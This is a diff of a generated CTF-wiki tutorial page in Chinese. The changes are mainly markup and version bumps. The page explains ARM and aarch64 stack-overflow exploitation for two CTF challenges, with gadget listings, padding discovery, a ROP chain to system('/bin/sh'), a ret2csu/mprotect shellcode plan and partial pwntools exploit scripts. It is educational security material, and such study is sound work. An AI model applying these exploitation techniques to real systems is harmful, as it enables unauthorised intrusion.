@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+      <meta name="generator" content="mkdocs-1.1, mkdocs-material-4.6.3">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../../assets/stylesheets/application.e194128b.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.3e3d1dff.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../../../assets/javascripts/modernizr.74668098.js"></script>
+      <script src="../../../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -4901,7 +4901,7 @@
 <h2 id="jarvisoj-typo">jarvisoj - typo<a class="headerlink" href="#jarvisoj-typo" title="Permanent link">&para;</a></h2>
 <p>这里以 jarvisoj 的 typo 一题为例进行展示，题目可以在 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/arm/jarvisOJ_typo">ctf-challenge</a> 下载</p>
 <h3 id="_3">确定保护<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
-<p><div class="codehilite"><pre><span></span>jarvisOJ_typo <span class="o">[</span>master●●<span class="o">]</span> check ./typo
+<p><div class="codehilite"><pre><span></span><code>jarvisOJ_typo <span class="o">[</span>master●●<span class="o">]</span> check ./typo
 typo: ELF <span class="m">32</span>-bit LSB executable, ARM, EABI5 version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.32, BuildID<span class="o">[</span>sha1<span class="o">]=</span>211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped
 <span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/m4x/pwn_repo/jarvisOJ_typo/typo&#39;</span>
     Arch:     arm-32-little
@@ -4909,11 +4909,11 @@ typo: ELF <span class="m">32</span>-bit LSB executable, ARM, EABI5 version <span
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE <span class="o">(</span>0x8000<span class="o">)</span>
-</pre></div>
+</code></pre></div>
 静态链接的程序，没有开栈溢出保护和 PIE; 静态链接说明我们可以在 binary 里找到 <strong>system</strong> 等危险函数和 <strong>"/bin/sh"</strong> 等敏感字符串，因为又是 No PIE， 所以我们只需要栈溢出就能构造 ropchain 来 get shell</p>
 <h3 id="_4">利用思路<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
 <p>因此需要我们找一个溢出点，先运行一下程序，因为是静态链接的，所以在环境配置好的情况下直接运行即可
-<div class="codehilite"><pre><span></span>jarvisOJ_typo <span class="o">[</span>master●●<span class="o">]</span> ./typo 
+<div class="codehilite"><pre><span></span><code>jarvisOJ_typo <span class="o">[</span>master●●<span class="o">]</span> ./typo 
 Let<span class="err">&#39;</span>s Do Some Typing Exercise~
 Press Enter to get start<span class="p">;</span>
 Input ~ <span class="k">if</span> you want to quit
@@ -4926,11 +4926,11 @@ survive
 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 qemu: uncaught target signal <span class="m">11</span> <span class="o">(</span>Segmentation fault<span class="o">)</span> - core dumped
 <span class="o">[</span><span class="m">1</span><span class="o">]</span>    <span class="m">1172</span> segmentation fault  ./typo
-</pre></div></p>
+</code></pre></div></p>
 <p>程序的输入点不多，很容易就能找到溢出点</p>
 <h3 id="rop">构造 ROP<a class="headerlink" href="#rop" title="Permanent link">&para;</a></h3>
 <p>因此思路就很明显了，利用栈溢出构造 <strong>system("/bin/sh")</strong>， 先找一下 gadgets
-<div class="codehilite"><pre><span></span>jarvisOJ_typo <span class="o">[</span>master●●<span class="o">]</span> ROPgadget --binary ./typo --only <span class="s2">&quot;pop&quot;</span>   
+<div class="codehilite"><pre><span></span><code>jarvisOJ_typo <span class="o">[</span>master●●<span class="o">]</span> ROPgadget --binary ./typo --only <span class="s2">&quot;pop&quot;</span>   
 Gadgets <span class="nv">information</span>
 <span class="o">============================================================</span>
 0x00020904 : pop <span class="o">{</span>r0, r4, pc<span class="o">}</span>
@@ -4948,9 +4948,9 @@ Gadgets <span class="nv">information</span>
 0x00014068 : pop <span class="o">{</span>r7, pc<span class="o">}</span>
 
 Unique gadgets found: <span class="m">13</span>
-</pre></div></p>
+</code></pre></div></p>
 <p>我们只需要控制第一个参数，因此可以选择 <code>pop {r0, r4, pc}</code> 这条 gadgets, 来构造如下的栈结构
-<div class="codehilite"><pre><span></span>+-------------+
+<div class="codehilite"><pre><span></span><code>+-------------+
 |             |
 |  padding    |
 +-------------+
@@ -4964,15 +4964,15 @@ Unique gadgets found: <span class="m">13</span>
 +-------------+
 |system_addr  |
 +-------------+
-</pre></div></p>
+</code></pre></div></p>
 <p>这时还需要 padding 的长度和 system 以及 /bin/sh 的地址， /bin/sh 的地址用 ROPgadget 就可以找到
-<div class="codehilite"><pre><span></span>jarvisOJ_typo <span class="o">[</span>master●●<span class="o">]</span> ROPgadget --binary ./typo --string /bin/sh
+<div class="codehilite"><pre><span></span><code>jarvisOJ_typo <span class="o">[</span>master●●<span class="o">]</span> ROPgadget --binary ./typo --string /bin/sh
 Strings <span class="nv">information</span>
 <span class="o">============================================================</span>
 0x0006cb70 : /bin/sh
-</pre></div>
+</code></pre></div>
 padding 的长度可以使用 pwntools 的 <strong>cyclic</strong> 来很方便的找到
-<div class="codehilite"><pre><span></span>pwndbg&gt; cyclic 200
+<div class="codehilite"><pre><span></span><code>pwndbg&gt; cyclic 200
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
 pwndbg&gt; c
 Continuing.
@@ -5020,13 +5020,13 @@ Invalid address 0x62616164
 Program received signal SIGSEGV
 pwndbg&gt; cyclic -l 0x62616164
 112
-</pre></div>
+</code></pre></div>
 因此 padding 长度即为 112</p>
 <blockquote>
 <p>或者可以更暴力一点直接爆破栈溢出的长度</p>
 </blockquote>
 <p>至于 system 的地址，因为这个 binary 被去除了符号表，我们可以先用 <code>rizzo</code> 来恢复部分符号表（关于恢复符号表暂时可以先看参考链接，以后会逐渐介绍）。虽然 rizzo 在这个 binary 上恢复的效果不好，但很幸运，在识别出来的几个函数中刚好有 system
-<div class="codehilite"><pre><span></span><span class="kt">char</span> <span class="o">*</span><span class="kr">__fastcall</span> <span class="nf">system</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">char</span> <span class="o">*</span><span class="kr">__fastcall</span> <span class="nf">system</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
 <span class="p">{</span>
   <span class="kt">char</span> <span class="o">*</span><span class="n">result</span><span class="p">;</span> <span class="c1">// r0</span>
 
@@ -5036,13 +5036,13 @@ pwndbg&gt; cyclic -l 0x62616164
     <span class="n">result</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)(</span><span class="n">sub_10BA8</span><span class="p">((</span><span class="kt">int</span><span class="p">)</span><span class="s">&quot;exit 0&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
   <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
 <span class="p">}</span>
-</pre></div></p>
+</code></pre></div></p>
 <blockquote>
 <p>或者可以通过搜索 /bin/sh 字符串来寻找 system 函数</p>
 </blockquote>
 <h2 id="exp">exp<a class="headerlink" href="#exp" title="Permanent link">&para;</a></h2>
 <p>所有的条件都有了，构造 system("/bin/sh") 即可
-<div class="codehilite"><pre><span></span>jarvisOJ_typo [master●●] cat solve.py 
+<div class="codehilite"><pre><span></span><code>jarvisOJ_typo [master●●] cat solve.py 
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
@@ -5086,11 +5086,11 @@ for i in range(112, 123):
         continue
     else:
         io.interactive()
-</pre></div></p>
+</code></pre></div></p>
 <h2 id="2018-baby_arm">2018 上海市大学生网络安全大赛 - baby_arm<a class="headerlink" href="#2018-baby_arm" title="Permanent link">&para;</a></h2>
 <h3 id="_5">静态分析<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
 <p>题目给了一个 <code>aarch64</code> 架构的文件，没有开 canary 保护
-<div class="codehilite"><pre><span></span>Shanghai2018_baby_arm <span class="o">[</span>master<span class="o">]</span> check ./pwn
+<div class="codehilite"><pre><span></span><code>Shanghai2018_baby_arm <span class="o">[</span>master<span class="o">]</span> check ./pwn
 + file ./pwn
 ./pwn: ELF <span class="m">64</span>-bit LSB executable, ARM aarch64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux-aarch64.so.1, <span class="k">for</span> GNU/Linux <span class="m">3</span>.7.0, BuildID<span class="o">[</span>sha1<span class="o">]=</span>e988eaee79fd41139699d813eac0c375dbddba43, stripped
 + checksec ./pwn
@@ -5100,9 +5100,9 @@ for i in range(112, 123):
     Stack:    No canary found
     NX:       NX enabled
     PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
-</pre></div>
+</code></pre></div>
 看一下程序逻辑
-<div class="codehilite"><pre><span></span><span class="kr">__int64</span> <span class="nf">main_logic</span><span class="p">()</span>
+<div class="codehilite"><pre><span></span><code><span class="kr">__int64</span> <span class="nf">main_logic</span><span class="p">()</span>
 <span class="p">{</span>
   <span class="n">Init</span><span class="p">();</span>
   <span class="n">write</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="s">&quot;Name:&quot;</span><span class="p">,</span> <span class="mi">5LL</span><span class="p">);</span>
@@ -5117,11 +5117,11 @@ for i in range(112, 123):
 
   <span class="n">read</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v0</span><span class="p">,</span> <span class="mi">512LL</span><span class="p">);</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 程序的主干读取了 512 个字符到一个全局变量上，而在 <code>sub_4007F0()</code> 中，又读取了 512 个字节到栈上，需要注意的是这里直接从 <code>frame pointer + 0x10</code> 开始读取，因此即使开了 canary 保护也无所谓。</p>
 <h3 id="_6">思路<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
 <p>理一下思路，可以直接 rop，但我们不知道远程的 libc 版本，同时也发现程序中有调用 <code>mprotect</code> 的代码段
-<div class="codehilite"><pre><span></span>.text:00000000004007C8                 STP             X29, X30, [SP,#-0x10]!
+<div class="codehilite"><pre><span></span><code>.text:00000000004007C8                 STP             X29, X30, [SP,#-0x10]!
 .text:00000000004007CC                 MOV             X29, SP
 .text:00000000004007D0                 MOV             W2, #0
 .text:00000000004007D4                 MOV             X1, #0x1000
@@ -5131,7 +5131,7 @@ for i in range(112, 123):
 .text:00000000004007E4                 NOP
 .text:00000000004007E8                 LDP             X29, X30, [SP],#0x10
 .text:00000000004007EC                 RET
-</pre></div>
+</code></pre></div>
 但这段代码把 <code>mprotect</code> 的权限位设成了 0，没有可执行权限，这就需要我们通过 rop 控制 <code>mprotect</code> 设置如 bss 段等的权限为可写可执行</p>
 <p>因此可以有如下思路：</p>
 <ol>
@@ -5140,7 +5140,7 @@ for i in range(112, 123):
 <li>返回到 bss 上的 shellcode</li>
 </ol>
 <p><code>mprotect</code> 需要控制三个参数，可以考虑使用 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium_rop/#ret2csu">ret2csu</a> 这种方法，可以找到如下的 gadgets 来控制 <code>x0, x1, x2</code> 寄存器
-<div class="codehilite"><pre><span></span>.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]
+<div class="codehilite"><pre><span></span><code>.text:00000000004008AC                 LDR             X3, [X21,X19,LSL#3]
 .text:00000000004008B0                 MOV             X2, X22
 .text:00000000004008B4                 MOV             X1, X23
 .text:00000000004008B8                 MOV             W0, W24
@@ -5155,9 +5155,9 @@ for i in range(112, 123):
 .text:00000000004008D4                 LDP             X23, X24, [SP,#var_s30]
 .text:00000000004008D8                 LDP             X29, X30, [SP+var_s0],#0x40
 .text:00000000004008DC                 RET
-</pre></div></p>
+</code></pre></div></p>
 <p>最终的 <a href="https://github.com/bash-c/pwn_repo/blob/master/Shanghai2018_baby_arm/solve.py">exp</a> 如下：
-<div class="codehilite"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<div class="codehilite"><pre><span></span><code><span class="ch">#!/usr/bin/env python</span>
 <span class="c1"># -*- coding: utf-8 -*-</span>
 
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
@@ -5207,27 +5207,27 @@ for i in range(112, 123):
     <span class="n">io</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
     <span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div></p>
+</code></pre></div></p>
 <h3 id="notice">notice<a class="headerlink" href="#notice" title="Permanent link">&para;</a></h3>
 <p>同时需要注意的是，<code>checksec</code> 检测的结果是开了 nx 保护，但这样检测的结果不一定准确，因为程序的 nx 保护也可以通过 qemu 启动时的参数 <code>-nx</code> 来决定（比如这道题目就可以通过远程失败时的报错发现程序开了 nx 保护），老版的 qemu 可能没有这个参数。
-<div class="codehilite"><pre><span></span>Desktop ./qemu-aarch64 --version
+<div class="codehilite"><pre><span></span><code>Desktop ./qemu-aarch64 --version
 qemu-aarch64 version <span class="m">2</span>.7.0, Copyright <span class="o">(</span>c<span class="o">)</span> <span class="m">2003</span>-2016 Fabrice Bellard and the QEMU Project developers
 Desktop ./qemu-aarch64 -h<span class="p">|</span> grep nx
 -nx           QEMU_NX           <span class="nb">enable</span> NX implementation
-</pre></div></p>
+</code></pre></div></p>
 <p>如果有如下的报错，说明没有 aarch64 的汇编器
-<div class="codehilite"><pre><span></span><span class="o">[</span>ERROR<span class="o">]</span> Could not find <span class="s1">&#39;as&#39;</span> installed <span class="k">for</span> ContextType<span class="o">(</span><span class="nv">arch</span> <span class="o">=</span> <span class="s1">&#39;aarch64&#39;</span>, <span class="nv">binary</span> <span class="o">=</span> ELF<span class="o">(</span><span class="s1">&#39;/home/m4x/Projects/ctf-challenges/pwn/arm/Shanghai2018_baby_arm/pwn&#39;</span><span class="o">)</span>, <span class="nv">bits</span> <span class="o">=</span> <span class="m">64</span>, <span class="nv">endian</span> <span class="o">=</span> <span class="s1">&#39;little&#39;</span>, <span class="nv">log_level</span> <span class="o">=</span> <span class="m">10</span><span class="o">)</span>
+<div class="codehilite"><pre><span></span><code><span class="o">[</span>ERROR<span class="o">]</span> Could not find <span class="s1">&#39;as&#39;</span> installed <span class="k">for</span> ContextType<span class="o">(</span><span class="nv">arch</span> <span class="o">=</span> <span class="s1">&#39;aarch64&#39;</span>, <span class="nv">binary</span> <span class="o">=</span> ELF<span class="o">(</span><span class="s1">&#39;/home/m4x/Projects/ctf-challenges/pwn/arm/Shanghai2018_baby_arm/pwn&#39;</span><span class="o">)</span>, <span class="nv">bits</span> <span class="o">=</span> <span class="m">64</span>, <span class="nv">endian</span> <span class="o">=</span> <span class="s1">&#39;little&#39;</span>, <span class="nv">log_level</span> <span class="o">=</span> <span class="m">10</span><span class="o">)</span>
     Try installing binutils <span class="k">for</span> this architecture:
     https://docs.pwntools.com/en/stable/install/binutils.html
-</pre></div>
+</code></pre></div>
 可以参考官方文档的解决方案
-<div class="codehilite"><pre><span></span>Shanghai2018_baby_arm <span class="o">[</span>master●<span class="o">]</span> apt search binutils<span class="p">|</span> grep aarch64
+<div class="codehilite"><pre><span></span><code>Shanghai2018_baby_arm <span class="o">[</span>master●<span class="o">]</span> apt search binutils<span class="p">|</span> grep aarch64
 p   binutils-aarch64-linux-gnu                                         - GNU binary utilities, <span class="k">for</span> aarch64-linux-gnu target
 p   binutils-aarch64-linux-gnu:i386                                    - GNU binary utilities, <span class="k">for</span> aarch64-linux-gnu target
 p   binutils-aarch64-linux-gnu-dbg                                     - GNU binary utilities, <span class="k">for</span> aarch64-linux-gnu target <span class="o">(</span>debug symbols<span class="o">)</span>
 p   binutils-aarch64-linux-gnu-dbg:i386                                - GNU binary utilities, <span class="k">for</span> aarch64-linux-gnu target <span class="o">(</span>debug symbols<span class="o">)</span>
 Shanghai2018_baby_arm <span class="o">[</span>master●<span class="o">]</span> sudo apt install bintuils-aarch64-linux-gnu
-</pre></div></p>
+</code></pre></div></p>
 <blockquote>
 <p>aarch64 的文件在装 libc 时是 <code>arm64</code>，在装 <code>binutils</code> 时是 <code>aarch64</code></p>
 </blockquote>
@@ -5335,7 +5335,7 @@ Shanghai2018_baby_arm <span class="o">[</span>master●<span class="o">]</span> 
       
     </div>
     
-      <script src="../../../../assets/javascripts/application.970603a6.js"></script>
+      <script src="../../../../assets/javascripts/application.df00da5d.js"></script>
       
         
         
@@ -5350,7 +5350,7 @@ Shanghai2018_baby_arm <span class="o">[</span>master●<span class="o">]</span> 
           
         
       
-      <script>app.initialize({version:"1.0.4",url:{base:"../../../.."}})</script>
+      <script>app.initialize({version:"1.1",url:{base:"../../../.."}})</script>
       
         <script src="https://cdnjs.loli.net/ajax/libs/pangu/3.3.0/pangu.min.js"></script>
       
